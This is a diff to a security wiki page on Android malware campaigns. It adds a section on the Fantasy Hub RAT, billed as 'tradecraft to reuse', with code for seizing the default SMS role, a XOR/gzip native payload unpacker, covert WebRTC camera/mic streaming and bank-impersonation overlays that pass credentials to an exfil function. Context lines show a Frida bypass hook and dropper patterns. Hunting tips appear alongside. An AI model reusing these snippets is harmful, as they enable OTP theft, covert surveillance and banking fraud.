@@ -63,6 +63,9 @@
 
 ## Useful Frida Snippet: Auto-Bypass Invitation Code
 
+<details>
+<summary>Frida hook to bypass invitation code</summary>
+
 ```python
 # frida -U -f com.badapp.android -l bypass.js --no-pause
 # Hook HttpURLConnection write to always return success
@@ -81,6 +84,8 @@ Java.perform(function() {
   };
 });
 ```
+
+</details>
 
 ## Indicators (Generic)
 
@@ -228,6 +233,9 @@ Attackers increasingly replace static APK links with a Socket.IO/WebSocket chann
 
 Typical client flow observed in the wild:
 
+<details>
+<summary>Socket.IO client flow to assemble APK from chunks</summary>
+
 ```javascript
 // Open Socket.IO channel and request payload
 const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
@@ -247,6 +255,8 @@ socket.on("downloadComplete", () => {
   document.body.appendChild(a); a.click();
 });
 ```
+
+</details>
 
 Why it evades simple controls:
 - No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
@@ -273,6 +283,9 @@ The RatOn banker/RAT campaign (ThreatFabric) is a concrete example of how modern
 Attackers present a WebView pointing to an attacker page and inject a JavaScript interface that exposes a native installer. A tap on an HTML button calls into native code that installs a second-stage APK bundled in the dropper’s assets and then launches it directly.
 
 Minimal pattern:
+
+<details>
+<summary>Android dropper Activity (PackageInstaller Session API)</summary>
 
 ```java
 public class DropperActivity extends Activity {
@@ -302,6 +315,8 @@ public class DropperActivity extends Activity {
   }
 }
 ```
+
+</details>
 
 HTML on the page:
 
@@ -429,6 +444,115 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - Detect installation/launch of an external NFC-relay app triggered by another app.
 - For banking: enforce out-of-band confirmations, biometrics-binding, and transaction-limits resistant to on-device automation.
 
+## Fantasy Hub RAT-as-a-Service – tradecraft to reuse (Android)
+
+Fantasy Hub is a MaaS Android RAT focused on phishing-driven installs and post-consent device takeover. The following techniques generalize to other campaigns.
+
+### Privilege consolidation via default SMS handler
+Requesting the default SMS role yields broad messaging control in a single consent step (OTP/2FA interception, silent forwarding/sending, notification reply/delete), avoiding multiple runtime prompts.
+
+Minimal request flow:
+```java
+Intent i = new Intent(android.provider.Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+i.putExtra(android.provider.Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
+startActivity(i); // Shows system chooser to set this app as default SMS
+```
+Once granted, abuse `ContentResolver` on `content://sms/*`, `SmsManager`/`Telephony` APIs, and notification listeners/replies to exfiltrate or auto-respond.
+
+Hunting
+- Unexpected ACTION_CHANGE_DEFAULT prompts from non-messaging apps.
+- Apps that immediately enumerate `content://sms` upon gaining foreground focus.
+
+### Native dropper: XOR + gzip (zlib windowBits=31) staged payload
+Fantasy Hub ships an encrypted/gzipped secondary payload in assets (e.g., assets/metadata.dat) and unpacks only at runtime from native code (libmetamask_loader.so), reducing static IoCs and frustrating Java-only hooks.
+
+Unpacker sketch:
+```c
+// key is a fixed 36-byte pattern; repeat across buffer
+void xor_dec(uint8_t *buf, size_t n, const uint8_t *key, size_t klen){
+  for(size_t i=0;i<n;i++) buf[i] ^= key[i % klen];
+}
+// gzip inflate with windowBits=31 (accepts zlib/gzip)
+int inflate_gzip(const uint8_t *in, size_t inlen, uint8_t **out, size_t *outlen){
+  z_stream s={0};
+  inflateInit2(&s, 31); // 31 => zlib+gzip, raw= -15
+  // ... feed in->out until Z_STREAM_END (omitted for brevity)
+  inflateEnd(&s);
+  return 0;
+}
+```
+Flow: read assets/metadata.dat → XOR-decrypt → zlib inflate (windowBits=31) → write decoded payload to disk → execute (e.g., load DEX/ELF or spawn component). Samples include environment checks (root/emulator) before decode.
+
+Hunting
+- assets/metadata.dat + native library with strings referencing inflateInit2/31.
+- lib name patterns like libmetamask_loader.so; JNI that reads assets then writes opaque bytes to app-private files.
+
+### Covert live A/V via WebRTC
+The RAT downloads WebRTC libs at runtime, then establishes a peer connection to stream camera/mic in real time. A tiny foreground notification (e.g., “Live stream active”) keeps the service alive.
+
+Minimal pattern:
+```java
+PeerConnectionFactory f = createFactory();
+PeerConnection pc = f.createPeerConnection(iceServers, observer);
+VideoSource vs = f.createVideoSource(false);
+VideoCapturer cap = createCameraCapturer(); cap.initialize(...); cap.startCapture(w,h,fps);
+AudioSource as = f.createAudioSource(new MediaConstraints());
+pc.addTrack(f.createVideoTrack("v0", vs));
+pc.addTrack(f.createAudioTrack("a0", as));
+// Signal SDP/ICE over HTTP to C2
+```
+Hunting
+- Non-Google origins hosting libwebrtc binaries for download by untrusted apps.
+- Foreground services with persistent minimal notifications while camera/mic are active.
+
+### Multi-brand impersonation with activity-alias + permissive WebView
+One APK exposes many launcher icons/labels via activity-alias all pointing to a single entry Activity that renders a WebView overlay window for a bank/brand and bridges credentials to native.
+
+Manifest sketch:
+```xml
+<activity android:name=".Launcher" android:exported="true"/>
+<activity-alias android:name=".Sber" android:targetActivity=".Launcher"
+  android:label="Сбербанк" android:icon="@drawable/ic_sber">
+  <intent-filter>
+    <action android:name="android.intent.action.MAIN"/>
+    <category android:name="android.intent.category.LAUNCHER"/>
+  </intent-filter>
+</activity-alias>
+<!-- Dozens of similar aliases (Alfa, PSB, Tbank, etc.) -->
+```
+Permissive WebView with JS bridge:
+```java
+wv.getSettings().setJavaScriptEnabled(true);
+wv.addJavascriptInterface(new Object(){
+  @android.webkit.JavascriptInterface public void submit(String user, String pin){ exfil(user,pin); }
+}, "bridge");
+wv.loadUrl(phishUrlFromC2);
+```
+Hunting
+- Dense activity-alias usage creating multiple launcher entries per APK.
+- WebView with @JavascriptInterface in non-browser apps + dynamic title/icon changes.
+
+### Telephony abuse, notifications, and kill-switch
+- USSD/calls: silently dial via tel: URIs/TelecomManager and select SIM slot; initiate USSD flows (e.g., tel:*123%23).
+- Notification control: auto-reply/delete notifications programmatically to intercept or hide evidence.
+- Self-destruct: disable receivers/services/components, cancel alarms, and wipe app data on command to reduce forensics.
+
+Selected command names observed: addContact, getContacts, sendSms, getCallLogs, createImagesZip, downloadMediaFile, webrtc_stream, requestSystemAsset (sensor capture), replyToNotification, deleteNotification, sendUssdWithChoice, executeCommand (dial/USSD), selfDestruct.
+
+### Defender triage and hunting tips (Fantasy Hub)
+Static
+- Native loader lib (e.g., libmetamask_loader.so) + assets/metadata.dat; JNI calls to inflateInit2(…, 31).
+- Manifest with heavy activity-alias usage and a permissive WebView exposing a JS bridge.
+
+Behavioral
+- Prompt to become default SMS app right after first launch; bursty ZIP/media exfiltration; silent USSD/calls; tiny persistent “Live stream active” notification during A/V capture.
+- Runtime download of WebRTC binaries from non-Google origins.
+
+Network/Config
+- Plain HTTP C2 with endpoints for media ZIPs and signaling; Telegram bot tokens/chat IDs embedded in resources or SharedPreferences for alert routing.
+- Presence of SharedPreferences keys such as invisible_intercept_enabled; services sampling accelerometer/gyro/light/proximity and beaconing device posture/state.
+
+
 ## References
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
@@ -440,5 +564,7 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [Fantasy Hub: Another Russian-based RAT-as-a-Service (MaaS)](https://zimperium.com/blog/fantasy-hub-another-russian-based-rat-as-m-a-a-s)
+- [Zimperium IOC – Fantasy Hub (2025-11)](https://github.com/Zimperium/IOC/tree/master/2025-11-FantasyHUB)
 
 {{#include ../../banners/hacktricks-training.md}}
